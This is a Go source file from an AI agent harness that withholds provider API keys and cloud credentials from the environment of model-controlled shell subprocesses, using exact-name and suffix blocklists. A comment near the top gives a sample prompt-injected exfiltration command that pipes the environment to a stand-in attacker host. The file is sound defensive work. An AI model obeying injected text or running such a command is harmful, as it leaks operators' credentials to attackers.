package process

import "strings"

// Secret scrubbing for model-controlled subprocesses.
//
// SanitizeEnv already strips code-injection vectors (LD_PRELOAD, BASH_ENV, …).
// This adds the second half: withholding the operator's *credentials* from the
// child. The Bash/exec tool is driven by the model, so a prompt-injected command
// ("run: env | curl evil?…") must not find provider API keys in its environment.
// The Python sandbox (codeaction) and MCP servers (mcpclient.childEnv) already
// exclude these via allowlists; the shell tool needs a broader env (git, gh, go,
// node), so it uses a blocklist instead — deny credentials, keep tooling.
//
// Deliberately conservative: we drop unambiguous cloud/service credentials but
// KEEP the tokens the shell legitimately needs (gh/git), local-only tokens
// (wormhole is 127.0.0.1), and DENEB_* runtime config. Bare _TOKEN/_KEY are NOT
// treated as secret suffixes precisely because GH_TOKEN/SSH_* are operational.

// secretEnvExact names external provider/service credentials to withhold by
// exact match (covers cases the suffix rules below would miss).
var secretEnvExact = map[string]struct{}{
	"ANTHROPIC_API_KEY":              {},
	"ANTHROPIC_AUTH_TOKEN":           {},
	"CLAUDE_CODE_OAUTH_TOKEN":        {},
	"OPENAI_API_KEY":                 {},
	"GEMINI_API_KEY":                 {},
	"GOOGLE_API_KEY":                 {},
	"GOOGLE_APPLICATION_CREDENTIALS": {},
	"ZAI_API_KEY":                    {},
	"MOONSHOT_API_KEY":               {},
	"KIMI_API_KEY":                   {},
	"MIMO_API_KEY":                   {},
	"OPENROUTER_API_KEY":             {},
	"DEEPSEEK_API_KEY":               {},
	"KAGI_API_KEY":                   {},
	// AWS SDK standard names — not caught by suffix rules (_KEY/_TOKEN are too
	// broad for GH_TOKEN/WORMHOLE_TOKEN, and AWS_SECRET_ACCESS_KEY ≠ *_SECRET_KEY).
	"AWS_ACCESS_KEY_ID":     {},
	"AWS_SECRET_ACCESS_KEY": {},
	"AWS_SESSION_TOKEN":     {},
}

// secretEnvSuffixes match any variable whose name unambiguously denotes a
// credential. Bare _TOKEN and _KEY are intentionally excluded (too broad —
// GH_TOKEN, SSH_AUTH_SOCK-adjacent names, etc. are operational).
var secretEnvSuffixes = []string{
	"_API_KEY", "_APIKEY", "_SECRET", "_SECRET_KEY",
	"_ACCESS_TOKEN", "_AUTH_TOKEN", "_PASSWORD", "_PRIVATE_KEY", "_CREDENTIALS",
}

// secretEnvKeep is the operational allowlist: credentials the model-controlled
// shell genuinely needs (gh/git for the PR/land flow) and that must survive
// scrubbing even if a future suffix rule would otherwise match them.
var secretEnvKeep = map[string]struct{}{
	"GH_TOKEN":     {},
	"GITHUB_TOKEN": {},
}

// IsSecretEnvKey is the exported alias for cross-package exec env overlay scrubbing.
func IsSecretEnvKey(key string) bool { return isSecretEnvKey(key) }

// isSecretEnvKey reports whether an env var carries a credential that must not
// reach a model-controlled subprocess. The operational keep-list wins.
func isSecretEnvKey(key string) bool {
	if _, ok := secretEnvKeep[key]; ok {
		return false
	}
	if _, ok := secretEnvExact[key]; ok {
		return true
	}
	upper := strings.ToUpper(key)
	for _, suf := range secretEnvSuffixes {
		if strings.HasSuffix(upper, suf) {
			return true
		}
	}
	return false
}
